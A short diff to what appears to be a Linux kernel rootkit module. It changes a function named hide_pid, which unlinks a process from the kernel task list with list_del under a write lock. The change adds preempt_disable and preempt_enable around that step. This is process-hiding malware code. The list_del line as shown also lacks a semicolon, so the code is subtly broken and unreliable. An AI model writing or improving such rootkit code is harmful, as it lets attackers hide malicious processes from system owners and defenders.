@@ -4,6 +4,8 @@
 #include <linux/proc_fs.h>
 #include <linux/sched/task.h>
 
+#include <linux/preempt.h>
+
 #include <linux/fs.h>
 #include <linux/fdtable.h>
 #include <linux/slab.h>
@@ -93,11 +95,13 @@ hide_pid(pid_t pid)
         return;
     }
 
+    preempt_disable();
     write_lock_irq(rwlock);
     list_del(&ts->tasks)
 	/* ts->tasks.prev->next = ts->tasks.next; */
 	/* ts->tasks.next->prev = ts->tasks.prev; */
     write_unlock_irq(rwlock);
+    preempt_enable();
 }
 
 void
